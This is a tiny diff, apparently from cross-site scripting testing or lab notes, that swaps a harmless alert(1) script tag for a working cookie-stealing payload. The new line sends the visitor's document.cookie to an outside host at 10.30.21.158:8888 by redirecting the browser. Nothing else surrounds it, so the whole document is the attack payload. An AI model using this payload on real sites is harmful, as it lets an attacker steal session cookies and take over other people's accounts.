@@ -1,1 +1,1 @@
-<script>alert(1)</script>
+<script>document.location='http://10.30.21.158:8888/?c='+document.cookie</script>
